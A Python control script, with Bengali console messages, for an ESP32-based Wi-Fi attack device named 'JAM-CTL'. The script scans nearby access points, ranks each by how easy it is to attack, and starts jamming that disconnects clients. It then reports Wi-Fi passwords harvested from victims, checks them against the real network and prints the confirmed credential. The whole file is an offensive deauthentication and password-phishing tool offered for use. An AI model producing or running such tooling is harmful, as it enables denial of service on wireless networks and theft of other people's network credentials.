import socket, sys, time

HOST = "192.168.4.1"
PORT = 8080
s = None

def connect():
    global s
    while True:
        try:
            print("[*] JAM-CTL (192.168.4.1) এ কানেক্ট করার চেষ্টা করা হচ্ছে...")
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(5)
            s.connect((HOST, PORT))
            print("[+] সফলভাবে কানেক্ট হয়েছে!")
            return s
        except Exception:
            print("[-] কানেকশন ফেইল! ফোনটি 'JAM-CTL' ওয়াইফাইয়ে কানেক্ট করুন...")
            time.sleep(3)

def send_cmd(cmd):
    global s
    try:
        s.sendall((cmd + "\n").encode())
    except:
        connect()
        s.sendall((cmd + "\n").encode())

def main():
    global s
    connect()
    
    print("[*] ওয়াইফাই স্ক্যান করা হচ্ছে...")
    send_cmd("SCAN")
    
    while True:
        try:
            data = s.recv(1024)
            if not data:
                print("[-] কন্ট্রোল লিংক বিচ্ছিন্ন হয়েছে, রি-কানেক্ট হচ্ছে...")
                connect(); continue
            
            for line in data.decode('utf-8', errors='ignore').splitlines():
                line = line.strip()
                if not line: continue
                
                if line.startswith("AP "):
                    parts = line.split(" ", 7)
                    if len(parts) >= 8:
                        _, idx, rssi, chan, enc, encn, diff, ssid = parts
                        COL = {"EASY":"\033[92m","GOOD":"\033[96m","MIXED":"\033[93m","HARD":"\033[91m"}
                        print(f"[{idx:>2}] {COL.get(diff,'')}{diff:<5}\033[0m {encn:<9} ch{chan:<3} {rssi:>4}dBm  {ssid}")
                
                elif line.startswith("EV "):
                    p = line[3:].split(" ", 3)
                    if p[0] == "JAM":  print(f"  ⚡ {p[1]}: দেখা {p[2]} | ডিসকানেক্টেড {p[3]}")
                    elif p[0] == "PW": print(f"  🔑 পাসওয়ার্ড এসেছে → {p[1]} : {p[2]}")
                    elif p[0] == "CHK":print(("  ✔ সত্যি — কানেক্ট হলো " if p[3]=="OK" else "  ✘ ভুল — জ্যাম চলছে ") + p[1])
                    elif p[0] == "DONE":
                        print(f"  🏁 DONE — {p[1]}: {p[2]}")
                        sys.exit(0)
                    elif p[0] == "LIST": print("  📋 সব মোবাইল লিস্ট থেকে ছিটকে গেছে")
                    elif p[0] == "INJ": print(f"  ℹ️ [INJ Status] {p[1]}")
                    elif p[0] == "SCAN" and "end" in line:
                        print("\n--- স্ক্যান সম্পন্ন ---")
                        cho = input("টার্গেট নম্বর দিন (যেমন: 0 বা 0,1): ").strip()
                        if cho:
                            first_idx = cho.split(',')[0].strip()
                            print(f"[*] চ্যানেল প্রিপেয়ার করা হচ্ছে (PREP {first_idx})...")
                            send_cmd(f"PREP {first_idx}")
                            
                            try: s.close()
                            except: pass
                            
                            print("[*] চ্যানেল বদলানো হলো — লিংক ফিরছে, ৪ সেকেন্ড অপেক্ষা করুন...")
                            time.sleep(4)
                            connect()
                            
                            print(f"[*] অ্যাটাক শুরু হচ্ছে (START {cho})...")
                            send_cmd(f"START {cho}")
                else:
                    print(f"[ESP32] {line}")
                    
        except socket.timeout:
            continue
        except KeyboardInterrupt:
            print("\n[*] বন্ধ করা হচ্ছে...")
            try: send_cmd("STOP")
            except: pass
            break
        except Exception as e:
            print(f"[-] এরর: {e}")
            connect()

if __name__ == "__main__":
    main()
